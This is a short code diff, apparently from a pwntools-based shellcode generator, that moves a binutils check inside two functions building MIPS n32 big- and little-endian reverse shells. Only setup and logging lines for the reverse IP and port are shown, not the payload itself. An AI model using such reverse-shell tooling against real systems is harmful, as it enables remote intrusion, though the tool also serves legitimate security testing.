@@ -2909,12 +2909,12 @@ exit 0x00183d
 
 
 def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
-	if(my_package.get_mipsn32_binutils() == 1):
-		return 
 	context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
 	context.arch = 'mipsn32'
 	context.endian = "big"
 	context.bits = "32"
+	if(my_package.get_mipsn32_binutils(context.arch) == 1):
+		return 
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_port = int(hex(reverse_port), 16)
@@ -3144,12 +3144,12 @@ nop
 			
 
 def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
-	if(my_package.get_mipsn32_binutils() == 1):
-		return 
 	context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
 	context.arch = 'mipsn32el'
 	context.endian = "little"
 	context.bits = "32"
+	if(my_package.get_mipsn32_binutils(context.arch) == 1):
+		return 
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_port=int(hex(reverse_port),16)
